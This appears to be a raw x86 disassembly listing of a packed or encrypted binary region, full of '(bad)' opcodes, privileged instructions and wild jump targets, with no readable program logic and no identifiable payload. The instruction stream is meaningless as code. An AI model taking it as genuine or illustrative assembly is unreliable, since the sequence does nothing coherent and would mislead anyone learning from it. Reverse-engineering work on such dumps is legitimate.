  407981:	mov    ecx,0xe6269760
  407986:	mov    al,0xe4
  407988:	iret   
  407989:	dec    ebp
  40798a:	stos   DWORD PTR es:[edi],eax
  40798b:	jmp    0x4079ab
  40798d:	lock arpl si,dx
  407990:	aad    0xbd
  407992:	jecxz  0x4079aa
  407994:	imul   ecx,DWORD PTR [esi],0xe
  407997:	and    ah,ah
  407999:	jmp    0x1705e016
  40799e:	cs jg  0x407988
  4079a1:	imul   ecx,DWORD PTR [ebp+0x3d464818],0xfc2850ba
  4079ab:	push   esi
  4079ac:	jae    0x407a00
  4079ae:	or     al,0xd2
  4079b0:	lahf   
  4079b1:	mov    esp,0xc53bcf18
  4079b6:	pop    ss
  4079b7:	mov    ebp,0x5fb88794
  4079bc:	enter  0xcca5,0x55
  4079c0:	test   DWORD PTR [esi],0xcca297c2
  4079c6:	jecxz  0x407957
  4079c8:	data16 or ah,cl
  4079cb:	dec    ebx
  4079cc:	loopne 0x407a4a
  4079ce:	add    DWORD PTR [esi],0x70
  4079d1:	lods   eax,DWORD PTR ds:[esi]
  4079d2:	icebp  
  4079d3:	cli    
  4079d4:	jno    0x4079f0
  4079d6:	rcr    DWORD PTR [ebp-0x38],cl
  4079d9:	lahf   
  4079da:	(bad)  
  4079dc:	sub    ebx,DWORD PTR [edi-0x24]
  4079df:	or     eax,0xe5295ba4
  4079e4:	ror    BYTE PTR [edi+0x6c],cl
  4079e7:	add    BYTE PTR [ecx-0x3f354f3c],al
  4079ed:	cld    
  4079ee:	in     eax,dx
  4079ef:	xor    DWORD PTR [edx-0x4a193121],ebx
  4079f5:	mov    WORD PTR fs:[ebx],es
  4079f8:	outs   dx,BYTE PTR ds:[esi]
  4079f9:	inc    BYTE PTR [ebx]
  4079fb:	adc    al,0x72
  4079fd:	stc    
  4079fe:	adc    DWORD PTR [edx-0x18],edi
  407a01:	xlat   BYTE PTR ds:[ebx]
  407a02:	jnp    0x407a0b
  407a04:	cwde   
  407a05:	retf   0x527c
  407a08:	sbb    esp,0xcd11c454
  407a0e:	ret    
  407a0f:	jnp    0x4079b0
  407a11:	mov    dh,0xa2
  407a13:	daa    
  407a14:	test   al,0xcc
  407a16:	pop    ebx
  407a17:	pop    esp
  407a18:	cmp    al,0x72
  407a1a:	xchg   ebx,eax
  407a1b:	fld    TBYTE PTR ds:0x5c411904
  407a21:	fwait
  407a22:	mov    eax,ds:0x3fc6a299
  407a27:	jb     0x407aa1
  407a29:	adc    ebp,edx
  407a2b:	xchg   esi,eax
  407a2c:	mov    esi,0x3114ca4e
  407a31:	mov    ds:0x2f16e7e7,al
  407a36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407a37:	bound  eax,QWORD PTR [edi]
  407a39:	cmp    cl,BYTE PTR [edi+0x48e7b575]
  407a3f:	jg     0x4079cc
  407a41:	or     BYTE PTR [ecx],ah
  407a43:	mov    ch,dl
  407a45:	daa    
  407a46:	loopne 0x407a92
  407a48:	bt     edx,ebx
  407a4b:	and    eax,0x1b21987a
  407a50:	pop    edi
  407a51:	push   ds
  407a52:	mov    dl,0xa8
  407a54:	cmp    al,0x6d
  407a56:	mov    edx,?
  407a58:	xchg   DWORD PTR ds:0x4274427b,eax
  407a5e:	cs scas eax,DWORD PTR es:[edi]
  407a60:	outs   dx,DWORD PTR ds:[esi]
  407a61:	jnp    0x407abd
  407a63:	pop    ds
  407a64:	sub    ah,bl
  407a66:	rcr    DWORD PTR [edx+0x42f5a69e],1
  407a6c:	(bad)  
  407a6d:	jbe    0x407a9b
  407a6f:	xlat   BYTE PTR ds:[ebx]
  407a70:	mov    ?,WORD PTR [edx+0x71a6e162]
  407a76:	mov    ah,0x6b
  407a78:	sub    DWORD PTR [esi-0x39],0xffffff9a
  407a7c:	mov    ds:0x34f0d9f5,al
  407a81:	jp     0x407a1d
  407a83:	fst    QWORD PTR [ecx+0x6ca36dde]
  407a89:	je     0x407aac
  407a8b:	cmp    al,0x8d
  407a8e:	or     al,0xc8
  407a90:	aaa    
  407a91:	sbb    ebp,ebp
  407a93:	(bad)  
  407a94:	xchg   esi,eax
  407a95:	inc    edi
  407a96:	(bad)  
  407a98:	in     al,0x20
  407a9a:	dec    ebp
  407a9b:	gs int 0xf7
  407a9e:	sar    esp,1
  407aa0:	ret    0xfb68
  407aa3:	cmc    
  407aa4:	iret   
  407aa5:	stc    
  407aa6:	sub    eax,0x5ee1898c
  407aab:	inc    esi
  407aac:	pop    esi
  407aad:	mov    eax,ds:0xb9832a2a
  407ab2:	mov    cl,0x30
  407ab4:	dec    edx
  407ab5:	out    dx,al
  407ab6:	fcmovnu st,st(5)
  407ab8:	loop   0x407af2
  407aba:	test   al,0x94
  407abc:	add    eax,0x6d4ebbf9
  407ac1:	xor    DWORD PTR [esi],0x20f51bac
  407ac7:	aas    
  407ac8:	or     BYTE PTR [eax],0x9
  407acb:	mov    ds:0x39b4f207,eax
  407ad0:	aad    0xaf
  407ad2:	adc    BYTE PTR [ecx-0x60],ah
  407ad5:	ins    BYTE PTR es:[edi],dx
  407ad6:	fwait
  407ad7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407ad8:	sbb    DWORD PTR [ebx+edi*8-0x54],eax
  407adc:	shl    ah,0x8b
  407adf:	adc    eax,0x5fd395d2
  407ae4:	gs fwait
  407ae6:	and    al,0x90
  407ae8:	mov    esp,0x4c6aa1a5
  407aed:	clc    
  407aee:	icebp  
  407aef:	(bad)  
  407af0:	pop    ebx
  407af1:	cmp    BYTE PTR [esi-0x7f91e25],bl
  407af7:	das    
  407af8:	ja     0x407aa4
  407afa:	mov    al,0x2a
  407afc:	jbe    0x407aa7
  407afe:	jle    0x407b6c
  407b00:	pusha  
  407b01:	inc    ebx
  407b02:	push   cs
  407b03:	test   DWORD PTR [ecx-0x2fccc1dc],ebx
  407b09:	outs   dx,DWORD PTR ds:[esi]
  407b0a:	mov    dh,0xb5
  407b0c:	int3   
  407b0d:	pushf  
  407b0e:	jne    0x407b55
  407b10:	adc    DWORD PTR [edi+0x56],ebx
  407b13:	popa   
  407b14:	sti    
  407b15:	mov    esi,esi
  407b17:	inc    eax
  407b18:	mov    DWORD PTR [esi+ebx*4+0x6d],esi
  407b1c:	sbb    eax,0xdcb06458
  407b21:	jle    0x407ac9
  407b23:	push   ecx
  407b24:	(bad)  
  407b25:	out    0x32,al
  407b27:	push   edx
  407b28:	dec    ebx
  407b29:	dec    eax
  407b2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407b2b:	sub    BYTE PTR [edi-0x6a],bh
  407b2e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407b2f:	inc    esi
  407b30:	sub    al,0x2e
  407b32:	xchg   esi,eax
  407b33:	(bad)  
  407b34:	stc    
  407b35:	or     edx,ecx
  407b37:	dec    edi
  407b38:	call   0x58df4506
  407b3d:	scas   al,BYTE PTR es:[edi]
  407b3e:	fimul  WORD PTR [ecx+ebp*1-0x3e3e5b2e]
  407b45:	scas   al,BYTE PTR es:[edi]
  407b46:	in     eax,0x54
  407b48:	push   cs
  407b49:	inc    ecx
  407b4a:	jle    0x407b4f
  407b4c:	fadd   QWORD PTR [ecx]
  407b4e:	arpl   WORD PTR [ecx+eax*1],si
  407b51:	jb     0x407b46
  407b53:	push   esi
  407b54:	adc    BYTE PTR [ecx+0x48feaddf],0x2f
  407b5b:	ds mov eax,0x5fdfefdb
  407b61:	jecxz  0x407b8e
  407b63:	icebp  
  407b64:	xor    ecx,eax
  407b66:	mov    ch,0x91
  407b68:	mov    cl,ch
  407b6a:	inc    BYTE PTR [edx-0x7c6f853b]
  407b70:	jge    0x407b53
  407b72:	jns    0x407ba4
  407b74:	mov    edx,0xc68a4ef1
  407b79:	adc    edi,eax
  407b7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407b7c:	cmp    dl,BYTE PTR [esi-0x74ed2876]
  407b82:	scas   eax,DWORD PTR es:[edi]
  407b83:	add    DWORD PTR [ebx+0x5d49dc2],esi
  407b89:	xchg   edx,eax
  407b8a:	xchg   edx,eax
  407b8b:	add    eax,0xc6197ad3
  407b90:	lods   eax,DWORD PTR ds:[esi]
  407b91:	mov    ebp,0xe0a2ce33
  407b96:	cli    
  407b97:	lods   eax,DWORD PTR ds:[esi]
  407b98:	add    DWORD PTR [esi+0x27],eax
  407b9b:	mov    ebx,ebp
  407b9d:	(bad)  
  407b9e:	jle    0x407bce
  407ba0:	arpl   bp,ax
  407ba2:	mov    edx,0xd32eb76
  407ba7:	outs   dx,BYTE PTR ds:[esi]
  407ba8:	jmp    0x23cdcbd5
  407bad:	dec    esi
  407bae:	leave  
  407baf:	das    
  407bb0:	ds (bad) 
  407bb2:	sti    
  407bb3:	fs pushf 
  407bb5:	or     eax,0x3c89ac6b
  407bba:	out    0xb8,al
  407bbc:	xor    esp,DWORD PTR [eax-0x58]
  407bbf:	int    0xf5
  407bc1:	ret    0xbc63
  407bc4:	push   ds
  407bc5:	std    
  407bc6:	mov    esi,0x274a02b0
  407bcb:	inc    eax
  407bcc:	sub    edx,DWORD PTR [edi]
  407bce:	inc    ecx
  407bcf:	popa   
  407bd0:	inc    edi
  407bd1:	mov    ch,0xc0
  407bd3:	leave  
  407bd4:	ins    DWORD PTR es:[edi],dx
  407bd5:	pop    ecx
  407bd6:	lea    esp,[edx+esi*8-0x503a000a]
  407bdd:	xchg   edi,eax
  407bdf:	hlt    
  407be0:	xor    DWORD PTR [ebx+eax*1],ebp
  407be3:	jbe    0x407b66
  407be5:	sub    al,0x37
  407be7:	push   ebx
  407be8:	xchg   edx,eax
  407be9:	push   eax
  407bea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407beb:	std    
  407bec:	sbb    eax,0x9f05587b
  407bf1:	mov    DWORD PTR ds:0x21ea2d60,edx
  407bf7:	pop    edi
  407bf8:	push   cs
  407bf9:	mov    ecx,0x1e1075e8
  407bfe:	sbb    BYTE PTR [edx-0xb9cc93f],ah
  407c04:	jp     0x407bec
  407c06:	sbb    al,0x28
  407c08:	int    0x69
  407c0a:	inc    ecx
  407c0b:	sbb    al,0xc4
  407c0d:	mov    esp,DWORD PTR [eax]
  407c0f:	and    BYTE PTR [ebp+0x13baefd9],dl
  407c15:	pop    edi
  407c16:	mov    al,0x3d
  407c18:	in     eax,dx
  407c19:	add    al,dh
  407c1b:	mov    ss,edi
  407c1d:	add    DWORD PTR [ecx],edi
  407c1f:	pop    eax
  407c20:	sub    eax,0xd567fdb4
  407c25:	adc    dl,BYTE PTR [eax+0x17]
  407c28:	mov    DWORD PTR [ecx+0x2e],ebp
  407c2b:	shl    bh,1
  407c2d:	cmp    BYTE PTR ds:0x25d1efe0,al
  407c33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407c34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407c35:	lahf   
  407c36:	inc    ebx
  407c37:	into   
  407c38:	repnz stos BYTE PTR es:[edi],al
  407c3a:	xchg   ecx,eax
  407c3b:	inc    edx
  407c3c:	xchg   ecx,eax
  407c3d:	and    edx,DWORD PTR [ecx-0x3710bc9]
  407c43:	inc    ebp
  407c44:	sub    DWORD PTR [ecx-0x21],ebp
  407c47:	jnp    0x407bfc
  407c49:	ss pop eax
  407c4b:	in     ax,dx
  407c4d:	xchg   DWORD PTR [ebx-0x56],edi
  407c50:	push   edx
  407c51:	cwde   
  407c52:	sbb    al,0xeb
  407c54:	xchg   ebp,eax
  407c55:	and    DWORD PTR [ebx+esi*8+0x27b00a9b],esi
  407c5c:	ja     0x407c91
  407c5e:	inc    esp
  407c5f:	and    DWORD PTR [eax],ecx
  407c61:	push   DWORD PTR ds:0x2f492542
  407c67:	hlt    
  407c68:	loope  0x407c24
  407c6a:	retf   
  407c6b:	xor    edx,DWORD PTR [edx+0x27]
  407c6e:	add    bh,ch
  407c70:	sub    eax,0x7d2a6453
  407c75:	mov    ds:0x51c4c350,al
  407c7a:	adc    ch,BYTE PTR [ecx*1+0x3574e9a0]
  407c81:	mov    BYTE PTR [esi-0x11d92e60],cl
  407c87:	sbb    edi,DWORD PTR [esi]
  407c89:	retf   0x4566
  407c8c:	add    al,bl
  407c8e:	jno    0x407c4b
  407c90:	dec    esp
  407c91:	adc    esi,DWORD PTR [ecx+0x7e]
  407c94:	sbb    ah,BYTE PTR [esi+0x49]
  407c97:	push   0x90affacb
  407c9c:	shl    cl,1
  407c9e:	les    ebx,FWORD PTR [ecx+0x42]
  407ca1:	or     bl,BYTE PTR [esp+edx*1-0x4a6be68b]
  407ca8:	js     0x407c52
  407caa:	stos   DWORD PTR es:[edi],eax
  407cab:	test   ebp,esp
  407cad:	lahf   
  407cae:	dec    edi
  407caf:	and    ch,BYTE PTR [ebx-0x62]
  407cb2:	in     eax,dx
  407cb3:	adc    eax,0x6eb140ac
  407cb8:	imul   edx,DWORD PTR [edi-0x40],0x1b
  407cbc:	adc    dh,ah
  407cbe:	(bad)  
  407cbf:	scas   eax,DWORD PTR es:[edi]
  407cc0:	xchg   ebp,eax
  407cc1:	xchg   ecx,eax
  407cc2:	(bad)  
  407cc3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407cc4:	sub    BYTE PTR [eax],dh
  407cc6:	sbb    eax,0xaad5eb27
  407ccb:	(bad)  
  407ccc:	jmp    0x5e2b:0x410856d
  407cd3:	sbb    DWORD PTR [ebx],esi
  407cd5:	(bad)  
  407cd6:	xlat   BYTE PTR ds:[ebx]
  407cd7:	add    al,0x25
  407cd9:	rol    DWORD PTR [esi+0x4e],0xc6
  407cdd:	push   ss
  407cde:	ret    0xd3c6
  407ce1:	pusha  
  407ce2:	fdivr  QWORD PTR [edi-0x2a]
  407ce5:	pop    ecx
  407ce6:	dec    edi
  407ce7:	xchg   ebp,eax
  407ce8:	and    eax,0xb1a8ae73
  407ced:	mov    ds:0xb8aa3a7e,al
  407cf2:	jmp    0x55fed45b
  407cf7:	dec    ebp
  407cf8:	push   ds
  407cf9:	push   esi
  407cfa:	bound  eax,QWORD PTR ds:0x9a0b50b7
  407d00:	out    dx,al
  407d01:	(bad)  
  407d02:	xor    al,0x56
  407d04:	push   0xe4df2068
  407d09:	fidivr WORD PTR [edi-0x4f]
  407d0c:	imul   edi,DWORD PTR [ebx-0x41],0x1d
  407d10:	mov    ah,0xa9
  407d12:	dec    ebp
  407d13:	call   0x9e8a810c
  407d18:	mov    cl,0xa4
  407d1a:	mov    dh,0xd
  407d1c:	push   esp
  407d1d:	fwait
  407d1e:	div    DWORD PTR [ecx-0x7d]
  407d21:	scas   eax,DWORD PTR es:[edi]
  407d22:	adc    al,0xd3
  407d24:	mov    ebx,edx
  407d26:	test   BYTE PTR [eax],0xfb
  407d29:	push   edx
  407d2a:	cmp    DWORD PTR [edx+0x21],ebx
  407d2d:	dec    esi
  407d2e:	add    BYTE PTR [edx-0x28],al
  407d31:	(bad)  
  407d32:	mov    DWORD PTR [ecx+0x5e6f9cf0],ecx
  407d38:	stc    
  407d39:	jns    0x407d81
  407d3b:	pop    es
  407d3c:	push   esp
  407d3d:	inc    esp
  407d3e:	addps  xmm7,XMMWORD PTR [edi+0x51]
  407d42:	fiadd  DWORD PTR [esi]
  407d44:	dec    dl
  407d46:	push   eax
  407d47:	pop    esi
  407d48:	sar    BYTE PTR [ebx+0x38],0x99
  407d4c:	lds    ebx,FWORD PTR [ebp+0x6a949bdc]
  407d52:	sub    eax,0xffcb6856
  407d57:	push   eax
  407d58:	push   ss
  407d59:	out    0x3e,al
  407d5b:	imul   eax,eax,0x6ca2e8de
  407d61:	jle    0x407d60
  407d63:	cmp    eax,0xc7ca2f69
  407d68:	sbb    ah,bh
  407d6a:	sub    ebx,DWORD PTR [esi]
  407d6c:	sahf   
  407d6d:	fwait
  407d6e:	js     0x407d79
  407d70:	jnp    0x407db8
  407d72:	cmp    BYTE PTR [eax],bl
  407d74:	and    eax,0xd68524f3
  407d79:	sbb    esp,DWORD PTR [ecx-0x20]
  407d7c:	cmp    eax,0x78048dc7
  407d81:	add    al,ah
  407d83:	outs   dx,BYTE PTR ds:[esi]
  407d84:	(bad)  
  407d85:	jb     0x407d69
  407d87:	fsub   DWORD PTR [edx-0x33]
  407d8a:	inc    esp
  407d8b:	pop    ebp
  407d8d:	and    DWORD PTR gs:[edi-0x62],ebp
  407d91:	ret    0x63db
  407d94:	add    al,0x45
  407d96:	out    0xd5,eax
  407d98:	sub    BYTE PTR [eax-0x48],ch
  407d9b:	pop    eax
  407d9c:	dec    ecx
  407d9d:	fnsave [ebp-0x4]
  407da0:	loope  0x407d94
  407da2:	push   esp
  407da3:	cmp    al,0x7e
  407da5:	mov    ch,0x81
  407da7:	sar    ah,cl
  407da9:	dec    edi
  407daa:	mov    eax,0x9f55c8eb
  407daf:	mov    dl,0xe8
  407db2:	sbb    DWORD PTR [ebx-0x742a9e5f],0x4ab0ff56
  407dbc:	xor    ecx,DWORD PTR [esi-0x1d]
  407dbf:	daa    
  407dc0:	bound  esp,QWORD PTR ds:0xe2c70f6b
  407dc6:	and    edx,DWORD PTR [eax+0x32652879]
  407dcc:	das    
  407dcd:	push   0x98ddef76
  407dd2:	(bad)  
  407dd3:	sbb    BYTE PTR [ecx-0x705b51a1],cl
  407dd9:	scas   al,BYTE PTR es:[edi]
  407dda:	xchg   ch,dl
  407ddc:	push   0x6a2b91e3
  407de1:	dec    edi
  407de2:	popf   
  407de3:	dec    ebp
  407de4:	push   0xe110836c
  407de9:	mov    ds:0x6e97e169,eax
  407dee:	out    dx,al
  407def:	sbb    eax,0xdf7e77b1
  407df4:	outs   dx,DWORD PTR ds:[esi]
  407df5:	push   edx
  407df6:	adc    ch,ah
  407df8:	and    eax,DWORD PTR [edx]
  407dfa:	retf   
  407dfb:	push   eax
  407dfc:	inc    edx
  407dfd:	fidiv  WORD PTR [esi+esi*8+0x37]
  407e01:	sbb    bh,BYTE PTR [ebp-0x4]
  407e04:	adc    al,0x9c
  407e06:	xlat   BYTE PTR ds:[ebx]
  407e07:	inc    ebp
  407e08:	lahf   
  407e09:	daa    
  407e0a:	mov    esp,0x3ba17d1a
  407e0f:	popf   
  407e10:	mov    DWORD PTR [ebx],esi
  407e12:	push   0x4d
  407e14:	(bad)  
  407e15:	shl    ebp,1
  407e17:	aad    0x19
  407e19:	lea    esp,[edx-0x2cc886c7]
  407e1f:	jle    0x407e07
  407e21:	pop    es
  407e22:	fiadd  WORD PTR [ebx-0x9]
  407e25:	sahf   
  407e26:	dec    esi
  407e27:	mov    dh,0x40
  407e29:	add    BYTE PTR [ebp+0x6221897d],bl
  407e2f:	faddp  st(7),st
  407e31:	add    DWORD PTR [ebx],0xe
  407e34:	repz inc eax
  407e36:	loope  0x407e7f
  407e38:	push   cs
  407e39:	das    
  407e3a:	lods   eax,DWORD PTR ds:[esi]
  407e3b:	jmp    0xc852:0xcab908f3
  407e42:	or     al,0x11
  407e44:	(bad)  
  407e45:	out    0x2a,eax
  407e47:	aaa    
  407e48:	jb     0x407ddf
  407e4a:	cmp    ecx,DWORD PTR [esi-0x460ca5d1]
  407e50:	dec    edi
  407e51:	xlat   BYTE PTR ds:[ebx]
  407e52:	mov    ?,edx
  407e54:	popf   
  407e55:	ret    0x3a64
  407e58:	xor    ecx,DWORD PTR gs:[edx]
  407e5b:	mov    esi,0x25dc70c2
  407e60:	mov    ah,0xb5
  407e62:	dec    esi
  407e63:	loop   0x407dec
  407e65:	retf   0xd6ee
  407e68:	mov    ch,BYTE PTR [ebx-0x287d3cce]
  407e6e:	imul   eax,DWORD PTR ss:[ebx-0x593bcbc1],0x4fda1c4b
  407e79:	lods   eax,DWORD PTR ds:[esi]
  407e7a:	pop    ds
  407e7b:	jae    0x407eea
  407e7d:	inc    ecx
  407e7e:	xor    bh,BYTE PTR [ebx+ebp*1]
  407e81:	xchg   ebp,eax
  407e82:	jle    0x407e13
  407e84:	mov    ds,WORD PTR [edi]
  407e86:	xor    eax,0x6556490
  407e8b:	jne    0x407f0c
  407e8d:	mov    dl,0xb2
  407e8f:	test   al,0x54
  407e91:	jae    0x407e7d
  407e93:	int3   
  407e94:	add    edi,DWORD PTR [ebp-0x71]
  407e97:	sbb    DWORD PTR [ebx-0x64],ecx
  407e9a:	mov    esp,0xe361f1a7
  407e9f:	inc    edx
  407ea0:	loope  0x407e8e
  407ea2:	and    al,0x37
  407ea4:	mov    bh,bl
  407ea6:	data16 js 0x407ec1
  407ea9:	pushf  
  407eaa:	push   ebx
  407eab:	jecxz  0x407e78
  407ead:	retf   
  407eae:	clc    
  407eaf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407eb0:	or     edi,DWORD PTR [edi-0x23e802c8]
  407eb6:	gs fs cmc 
  407eb9:	sub    DWORD PTR [ebp-0x454abb4b],ebx
  407ebf:	cmp    dh,BYTE PTR [eax-0x75]
  407ec2:	shl    BYTE PTR [ecx-0xd],1
  407ec5:	sti    
  407ec6:	nop
  407ec7:	dec    ebp
  407ec8:	mov    edx,ebx
  407eca:	repnz mov esi,0x5baa1894
  407ed0:	add    ebx,0xafa4a01c
  407ed6:	jae    0x407ea6
  407ed8:	repz push 0x34
  407edb:	pusha  
  407edc:	add    ah,BYTE PTR [esi+eax*4+0x4914ee6]
  407ee3:	cld    
  407ee4:	rcr    DWORD PTR [ebp+ebx*8-0x7a41181a],0x2f
  407eec:	loope  0x407ecb
  407eee:	clc    
  407eef:	sub    edx,DWORD PTR [esi+edi*1+0x6f]
  407ef3:	mov    edi,0x9484d23c
  407ef8:	lea    esp,[esi+0x11c4b90a]
  407efe:	mov    ch,0x82
  407f00:	jb     0x407e8a
  407f02:	add    al,0x48
  407f04:	xor    eax,DWORD PTR [ecx+0x5d]
  407f07:	xchg   DWORD PTR [ecx+0x425779ba],edi
  407f0d:	push   edx
  407f0e:	ss (bad) 
  407f10:	sub    al,0x1a
  407f12:	sbb    DWORD PTR [esi+ecx*4-0x34],edi
  407f16:	push   es
  407f17:	or     ah,0x5f
  407f1a:	ins    BYTE PTR es:[edi],dx
  407f1b:	sti    
  407f1c:	loope  0x407f76
  407f1e:	jb     0x407ee2
  407f20:	fisubr DWORD PTR [ebx]
  407f22:	sbb    ecx,DWORD PTR [edx+0x2215b4a0]
  407f28:	adc    eax,0x20908f00
  407f2d:	dec    edi
  407f2e:	push   ds
  407f2f:	lds    eax,FWORD PTR [ebx]
  407f31:	mov    al,BYTE PTR [ecx-0x4c]
  407f34:	mov    ch,0x3d
  407f36:	push   esp
  407f37:	fist   DWORD PTR [esi-0x51]
  407f3a:	pop    esp
  407f3b:	stc    
  407f3c:	(bad)  
  407f3d:	pop    esp
  407f3e:	add    eax,0xcc6a491a
  407f43:	mov    ecx,0xd452cec7
  407f48:	sar    DWORD PTR [eax+0x77],1
  407f4b:	fs mov esi,0x42ba94c6
  407f51:	cmp    al,0x84
  407f53:	add    dl,al
  407f55:	test   bl,bh
  407f57:	out    0x81,al
  407f59:	and    al,0xdb
  407f5b:	mov    ah,0x23
  407f5d:	mov    DWORD PTR [eax+0x7b3e0004],0x425e0a6d
  407f67:	push   ss
  407f68:	sbb    BYTE PTR [edx],dh
  407f6a:	rol    edx,1
  407f6c:	pop    eax
  407f6d:	push   edx
  407f6e:	cmp    DWORD PTR [ebx-0xdf7d31],esp
  407f74:	cmp    DWORD PTR ds:0xa7a8ac05,edx
  407f7a:	jg     0x407f1e
  407f7c:	jne    0x407fe1
  407f7e:	in     eax,0x7c
  407f80:	sbb    ebp,DWORD PTR [esi]
  407f82:	cmp    bl,BYTE PTR [esp+eax*2+0x359b30c9]
  407f89:	cs jg  0x407f48
  407f8c:	sar    BYTE PTR [ecx-0x2f],0xee
  407f90:	pop    eax
  407f91:	xchg   esp,eax
  407f92:	adc    al,0x6c
  407f94:	mov    edi,0xb16492fe
  407f99:	xchg   esi,eax
  407f9a:	jle    0x407f58
  407f9c:	cmp    DWORD PTR [ebx],0x863179cc
  407fa2:	inc    esi
  407fa3:	jae    0x408024
  407fa5:	ja     0x407f89
  407fa7:	lock stc 
  407fa9:	je     0x407f76
  407fab:	loope  0x40801d
  407fad:	popf   
  407fae:	mov    ebx,0x479df2a8
  407fb3:	or     al,0xe
  407fb6:	inc    edi
  407fb7:	mov    esi,0x509fc1bc
  407fbc:	lods   eax,DWORD PTR ds:[esi]
  407fbd:	adc    DWORD PTR [edi-0x52952fa5],edi
  407fc3:	shl    esp,cl
  407fc5:	int    0xcc
  407fc7:	into   
  407fc8:	and    BYTE PTR [edi],dl
  407fca:	dec    ecx
  407fcb:	push   edx
  407fcc:	adc    eax,0xc495e640
  407fd1:	xor    edx,DWORD PTR [ebx-0x349abf55]
  407fd7:	lahf   
  407fd8:	call   0x87d93ad2
  407fdd:	dec    esp
  407fde:	stc    
  407fdf:	dec    esp
  407fe0:	pop    ecx
  407fe1:	mov    ah,0xac
  407fe3:	test   BYTE PTR [ebp+0x77cf693e],dh
  407fe9:	or     BYTE PTR [eax+0x42],0x61
  407fed:	stos   BYTE PTR es:[edi],al
  407fee:	inc    ebp
  407fef:	mov    cl,0xf5
  407ff1:	rol    ah,1
  407ff3:	inc    ecx
  407ff4:	lea    edx,[ecx+0x7f48f207]
  407ffa:	mov    WORD PTR [edx+ecx*1],?
  407ffd:	push   esi
  407ffe:	loop   0x408008
  408000:	xchg   esi,eax
  408001:	lods   al,BYTE PTR ds:[esi]
  408002:	test   al,0x17
  408004:	jecxz  0x40803e
  408006:	pop    ebp
  408007:	jp     0x408075
  408009:	je     0x407f97
  40800b:	adc    DWORD PTR [ebp+0x75],ebp
  40800e:	mov    edi,0x13856bd9
  408013:	and    al,0x3c
  408015:	out    0x14,eax
  408017:	inc    ebx
  408018:	push   esi
  408019:	js     0x407fa3
  40801b:	sbb    al,0xd
  40801d:	jno    0x407fe0
  40801f:	sbb    bl,BYTE PTR [edx+0x18]
  408022:	ret    
  408023:	imul   edx,DWORD PTR [eax-0x78],0xffffff8a
  408027:	dec    ebx
  408028:	mov    dh,0x4f
  40802a:	fild   WORD PTR ds:0x485bdc7b
  408030:	adc    DWORD PTR [esi],eax
  408032:	mov    eax,ds:0x13ea6b9c
  408037:	adc    esp,0xffffff9a
  40803a:	mov    al,0xa0
  40803c:	pop    ss
  40803d:	cld    
  40803e:	add    al,BYTE PTR [edi]
  408040:	inc    edx
  408041:	leave  
  408042:	idiv   BYTE PTR [edx]
  408044:	push   edi
  408045:	cmc    
  408046:	jb     0x40807d
  408048:	(bad)  
  408049:	dec    ebx
  40804a:	xchg   BYTE PTR ds:0x364a812e,dh
  408050:	gs into 
  408052:	push   es
  408053:	pop    eax
  408054:	ficom  DWORD PTR [edx-0x5c3b5804]
  40805a:	cmp    ebx,edi
  40805c:	push   ecx
  40805d:	xor    BYTE PTR [ebp+0x4ba5bd24],ch
  408063:	hlt    
  408064:	jae    0x40805d
  408066:	lods   eax,DWORD PTR ds:[esi]
  408067:	call   0xdf34eaa9
  40806c:	fdiv   st,st(4)
  40806e:	sub    ebx,DWORD PTR [eax+edx*1]
  408071:	jmp    0x4080f0
  408073:	or     ebx,eax
  408075:	pop    esi
  408076:	mov    ah,0x26
  408078:	test   al,0xfa
  40807a:	sub    DWORD PTR [edi-0x4f],ecx
  40807d:	xor    al,0xd2
  40807f:	mov    eax,ds:0x8f077659
  408084:	(bad)  
  408085:	rol    edi,cl
  408087:	lahf   
  408088:	mov    DWORD PTR [esi+0x254853a5],esi
  40808e:	inc    edi
  40808f:	lods   eax,DWORD PTR ds:[esi]
  408090:	loope  0x408033
  408092:	sbb    dh,bh
  408094:	out    dx,eax
  408095:	mov    dl,0xf8
  408097:	pusha  
  408098:	cmp    esi,eax
  40809a:	out    dx,eax
  40809b:	xor    ecx,DWORD PTR [eax]
  40809d:	out    dx,al
  40809e:	xor    DWORD PTR [edx],ebx
  4080a0:	mov    bh,0xa1
  4080a2:	sub    DWORD PTR [ecx-0x7c15901e],eax
  4080a8:	ror    DWORD PTR [ebx],cl
  4080aa:	add    al,0xa8
  4080ac:	mov    ch,0x90
  4080ae:	xchg   ebp,eax
  4080af:	inc    ebp
  4080b0:	pop    esi
  4080b1:	or     edx,0xffffffef
  4080b4:	mov    ds:0x2443afed,eax
  4080b9:	pushf  
  4080ba:	stos   DWORD PTR es:[edi],eax
  4080bb:	mov    eax,0x2f14ce7d
  4080c0:	cli    
  4080c1:	or     esi,DWORD PTR [ecx-0x1c]
  4080c4:	dec    eax
  4080c5:	sti    
  4080c6:	or     ecx,esp
  4080c8:	inc    esi
  4080c9:	sub    ah,BYTE PTR [edx]
  4080cb:	sbb    ebx,DWORD PTR [ebp-0x7a]
  4080ce:	cli    
  4080cf:	loopne 0x4080f0
  4080d1:	mov    al,0x18
  4080d3:	inc    eax
  4080d4:	lahf   
  4080d5:	and    esp,edx
  4080d7:	sbb    DWORD PTR [edx+0x14e72443],ebx
  4080dd:	push   ebx
  4080de:	scas   eax,DWORD PTR es:[edi]
  4080df:	imul   ecx,DWORD PTR [ecx+edx*8-0x3b],0x1a
  4080e4:	int3   
  4080e5:	stc    
  4080e6:	les    edx,FWORD PTR [esi+0x53eb7b5d]
  4080ec:	pop    ebx
  4080ed:	sti    
  4080ee:	stos   DWORD PTR es:[edi],eax
  4080ef:	jmp    0xacba5ed1
  4080f4:	mov    dh,0x5
  4080f6:	mov    edi,0xa9dbcfd0
  4080fb:	dec    eax
  4080fc:	inc    esp
  4080fd:	sub    BYTE PTR [ebx-0x6b],dh
  408100:	ret    0x1abb
  408103:	lods   al,BYTE PTR ds:[esi]
  408104:	xor    eax,0x206996a0
  408109:	data16 jge 0x40811c
  40810c:	jmp    0xadde2eba
  408111:	mov    ebx,0x1e135983
